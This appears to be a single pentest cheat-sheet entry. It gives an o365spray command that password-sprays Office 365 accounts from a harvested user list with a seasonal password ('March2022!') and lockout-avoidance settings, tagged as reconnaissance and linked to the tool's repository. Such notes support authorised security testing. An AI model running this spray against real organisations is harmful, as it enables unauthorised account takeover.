# python3 o365spray.py --spray -U usersfound.txt -p 'March2022!' --count 1 --lockout 1 --domain msplaintext.xyz

OS: Linux
Description: Office 365 Password Spray
Security Domains: Reconnaissance (https://www.notion.so/Reconnaissance-1434c8e5237680fe960be92e51e13491?pvs=21)
Target_Technology: smtp (https://www.notion.so/smtp-1444c8e523768063a9fad4623d09ce5d?pvs=21)
URL: https://github.com/0xZDH/o365spray